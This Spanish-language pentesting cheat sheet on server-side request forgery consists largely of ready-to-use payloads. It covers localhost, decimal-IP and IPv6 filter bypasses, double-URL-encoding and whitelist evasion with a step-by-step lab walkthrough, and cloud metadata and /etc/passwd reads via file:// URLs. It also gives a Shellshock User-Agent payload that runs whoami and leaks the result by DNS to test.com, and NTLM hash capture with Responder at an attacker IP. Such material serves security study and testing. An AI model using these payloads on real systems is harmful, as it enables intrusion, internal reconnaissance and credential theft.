# Server-Side Request Forgery

- [Descripcion de la vulnerabilidad](#descripcion-de-la-vulnerabilidad)
- [Payloads comunes](#payloads-comunes)
- [Bypass de filtros](#bypass-de-filtros)
    - [Bypass localhost with CIDR](#bypass-localhost-with-cidr)
        - [Bypass using a decimal IP location](#bypass-using-a-decimal-ip-location)
            - [Bypass using HTTPS](#bypass-using-https)
    - [Bypass localhost with [::]](#bypass-localhost-with-)
    - [Bypass palabras en blacklist usando doble URL Encoding](#bypass-palabras-en-blacklist-usando-doble-url-encoding)
    - [Otros bypasses](#otros-bypasses)
    - [Bypass usando open redirection](#bypass-usando-open-redirection)
    - [Bypass de filtro basado en whitelist](#bypass-de-filtro-basado-en-whitelist)
- [Blind SSRF](#blind-ssrf)
    - [Out of Band](#out-of-band)
    - [Shellshock](#shellshock)
    - [Obtencion de NTLM hashes](#obtencion-de-ntlm-hashes)
- [Explotacion via URL handlers](#explotacion-via-url-handlers)
    - [File](#file)
    - [HTTP](#http)

# Descripcion de la vulnerabilidad

> Es una vulnerabilidad que ocurre cuando un atacante usa una aplicación para que realice solicitudes desde el servidor donde reside, en lugar de desde el cliente. 

Como atacantes nos permitiria:
- Enumerar los recursos internos
  - Webroot
  - Archivos de sistema
  - Uso de URL handlers: file://, http://
- Enumeracion de puertos y servicios internos del servidor
- Mandar peticiones a servidores controlados por el atacante

# Payloads comunes

- Usando `localhost`
```powershell
http://localhost:80
http://localhost:443
http://localhost:22
```
    
- Usando `127.0.0.1`
```powershell
http://127.0.0.1:80
http://127.0.0.1:443
http://127.0.0.1:22
```
    
- Usando `0.0.0.0`
```powershell
http://0.0.0.0:80
http://0.0.0.0:443
http://0.0.0.0:22
```

# Bypass de filtros

## Bypass localhost with CIDR

IP addresses from 127.0.0.0/8

```powershell
http://127.127.127.127
http://127.0.1.3
http://127.0.0.0
http://127.1
```

### Bypass using a decimal IP location

```powershell
http://2130706433/ = http://127.0.0.1
http://3232235521/ = http://192.168.0.1
http://3232235777/ = http://192.168.1.1
http://2852039166/ = http://169.254.169.254
```

#### Bypass using HTTPS

```powershell
https://127.0.0.1/
https://localhost/
```

### Bypass localhost with [::]

```powershell
http://[::]:80/
http://[::]:25/ SMTP
http://[::]:22/ SSH
http://[::]:3128/ Squid
```

### Bypass palabras en blacklist usando doble URL Encoding
````
http://127.1/%2561dmin
````

> 61 es “a” en hexadecimal pero tiene que ir acompañado de %25 para que sea interpretado todo junto de lo contrario 61dmin no serían caracteres especiales y por lo tanto no sería interpretado como admin.
### Otros bypasses

- Registrar tu propio nombre de dominio que se resuelva en 127.0.0.1. Puedes utilizar spoofed.burpcollaborator.net para este propósito.
- Ofuscar las cadenas bloqueadas utilizando URL Encoding o variando mayúsculas y minúsculas.

### Bypass usando open redirection
````
# Confirmamos que la redireccion se lleva a cabo
/product/ProductId=1&path=http://www.google.com

# Usamos la redireccion para acceder a donde queremos
/product/ProductId%3d1%26path%3dhttp%3a//192.168.0.12%3a8080/admin
````

### Bypass de filtro basado en whitelist
> Algunas aplicaciones sólo permiten entradas que coincidan, comiencen o contengan una lista blanca de valores permitidos.

La especificación de URL contiene varias características que se pueden pasar por alto al implementar el análisis y validación ad hoc de URLs:

- Podemos incrustar credenciales en una URL antes del nombre del host, usando el carácter @.

- Podemos usar el carácter # para indicar un fragmento de URL.

- Podemos aprovechar la jerarquía de nombres DNS para colocar una entrada requerida en un nombre DNS completamente calificado que controles.

- Podemos codificar caracteres de URL para ofuscar el código de análisis de URL. Esto es especialmente útil si el código que implementa el filtro maneja caracteres codificados de URL de manera diferente que el código que realiza la solicitud HTTP en el backend. Ten en cuenta que también puedes intentar codificar doblemente los caracteres; algunos servidores descodifican recursivamente la entrada que reciben, lo que puede llevar a más discrepancias.

Analicemos un ejemplo para ver como funciona un filtro en funcion a las respuestas:

````
http://127.0.0.1
"External stock check host must be test.com"
````
El filtro esta extrayendo el host y validandolo contra la whitelist

````
http://username@test.com/
"Could not connect to the external stock check service"
````

El error cambia indicandonos que acepta el uso de credenciales incluidas en la URL

````
http://username#@test.com/
"Could not connect to the external stock check service"
````

Al incluir el caracter # vuelve a rechazar la URL, vamos a meter doble URL encoding
````
http://username%2523@test.com/
"Internal Server Error"
````

El error nos indica que ha intentado conectarse a username, de esta manera podemos especificarle que se conecte a localhost

````
http://localhost%2523@test.com
````

Obtenemos un status 200 por lo que el siguiente paso seria hacer la redireccion a donde queramos

````
http://localhost:80%2523@test.com/admin
````

# Blind SSRF
## Out of Band
> Una explotación Blind SSRF con detección out-of-band ocurre cuando un atacante utiliza una vulnerabilidad de SSRF para realizar solicitudes HTTP a recursos internos del servidor, pero no recibe una respuesta directa del servidor que indique si la solicitud fue exitosa o no.

Por ejemplo, un atacante podría usar una vulnerabilidad de SSRF para enviar una solicitud HTTP a una dirección IP interna del servidor que no está disponible públicamente, como una base de datos o un servicio de correo interno. En este caso, el servidor no respondería directamente al atacante con información sobre la solicitud. Sin embargo, el atacante podría aprovechar una técnica out-of-band, como hacer que el servidor envíe una solicitud HTTP a un servidor controlado por el atacante, que incluya información sobre la solicitud original del atacante en el cuerpo de la solicitud. De esta manera, el atacante podría recibir la información que necesita para confirmar si la solicitud original tuvo éxito o no.

Este campo puede ser explotado en una vulnerabilidad de SSRF mediante el envío de una solicitud HTTP a un servidor externo, utilizando el campo `Referer` de la solicitud para indicarle al servidor externo que realice una solicitud a la dirección deseada. Si el servidor externo realiza la solicitud, se puede confirmar que la vulnerabilidad de SSRF existe

![image](https://github.com/n3masyst/Pentesting/assets/133997401/40a4a47f-86a7-4095-8da6-c897caa71700)

Al obtener la peticion en nuestro servidor confirmariamos que la explotacion ha sido exitosa
## Shellshock
En esta ocasion la explotacion seria similar al Out of band la diferencia es que debemos inyectar un payload y el campo donde se inyecta es el User Agent.

````
User-Agent:() { :; }; /usr/bin/nslookup $(whoami).test.com

# Respuesta:
john.test.com
````
## Obtencion de NTLM hashes
En un entorno de Active Directory al realizar una conexion Out of band hacia nuestro servidor donde tenemos a la escucha un envenenador de trafico LLMNR, NBT-NS y MDNS como responder podriamos obtener el hash NTLM de autenticacion del usuario que esta corriendo el servicio HTTP.
````
http://<ip_atacante>
````
![image](https://github.com/n3masyst/Pentesting/assets/133997401/39753071-b6ac-4ee5-8a8a-63e09f1ffe16)


# Explotacion via URL handlers
## File
Allows an attacker to fetch the content of a file on the server

```powershell
file://path/to/file
file:///etc/passwd
file://\/\/etc/passwd
ssrf.php?url=file:///etc/passwd
```

## HTTP

Allows an attacker to fetch any content from the web, it can also be used to scan ports.

```powershell
ssrf.php?url=http://127.0.0.1:22
ssrf.php?url=http://127.0.0.1:80
ssrf.php?url=http://127.0.0.1:443
ssrf.php?url=http://127.0.0.1/wp/index.php
ssrf.php?url=http://127.0.0.1/wp-content/plugins
ssrf.php?url=http://127.0.0.1/wordpress/index.html
```
